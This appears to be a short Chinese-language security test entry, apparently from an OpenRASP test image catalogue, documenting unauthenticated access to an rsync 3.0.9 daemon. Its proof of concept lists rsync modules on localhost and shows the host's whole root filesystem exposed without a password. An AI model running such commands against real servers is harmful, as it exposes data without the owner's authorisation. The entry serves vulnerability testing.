## 运维安全 - rsync 无认证

测试镜像

* src/rsync/3.0.9/

Poc

```
[OpenRASP] root@587e75753ac5:/ # rsync 127.0.0.1::
workspace      	root folder of this host
[OpenRASP] root@587e75753ac5:/ # rsync 127.0.0.1::workspace
drwxr-xr-x        4096 2018/04/22 01:23:37 .
-rwxr-xr-x           0 2018/04/22 01:23:37 .dockerenv
-rw-r--r--       11976 2018/04/02 18:39:33 anaconda-post.log
lrwxrwxrwx           7 2018/04/02 18:38:25 bin
lrwxrwxrwx           7 2018/04/02 18:38:25 lib
lrwxrwxrwx           9 2018/04/02 18:38:25 lib64
lrwxrwxrwx           8 2018/04/02 18:38:25 sbin
drwxr-xr-x        4096 2018/04/21 00:46:03 boot
drwxr-xr-x         360 2018/04/22 01:23:37 dev
drwxr-xr-x        4096 2018/04/22 01:23:37 etc
drwxr-xr-x        4096 2016/11/05 15:38:36 home
drwxr-xr-x        4096 2016/11/05 15:38:36 media
drwxr-xr-x        4096 2016/11/05 15:38:36 mnt
drwxr-xr-x        4096 2016/11/05 15:38:36 opt
dr-xr-xr-x           0 2018/04/22 01:23:37 proc
dr-xr-x---        4096 2018/04/22 01:23:37 root
drwxr-xr-x        4096 2018/04/21 00:47:52 run
drwxr-xr-x        4096 2016/11/05 15:38:36 srv
dr-xr-xr-x           0 2018/04/22 01:23:37 sys
drwxrwxrwt        4096 2018/04/21 00:47:52 tmp
drwxr-xr-x        4096 2018/04/02 18:38:25 usr
drwxr-xr-x        4096 2018/04/21 00:47:25 var
```

